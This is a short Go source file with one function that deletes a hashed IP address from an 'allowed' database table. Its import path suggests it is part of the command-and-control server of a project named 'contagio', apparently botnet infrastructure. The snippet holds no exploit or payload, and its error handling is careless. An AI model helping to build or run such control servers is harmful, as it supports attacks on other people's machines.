package database

import (
	"contagio/contagio/cnc/utils"
	"fmt"
)

func RemoveIp(ip string) {

	statement, err := Db.Prepare("DELETE from allowed where ip=?")
	if err != nil {
		fmt.Println(err)
	}
	statement.Exec(utils.Sha3(ip))
}
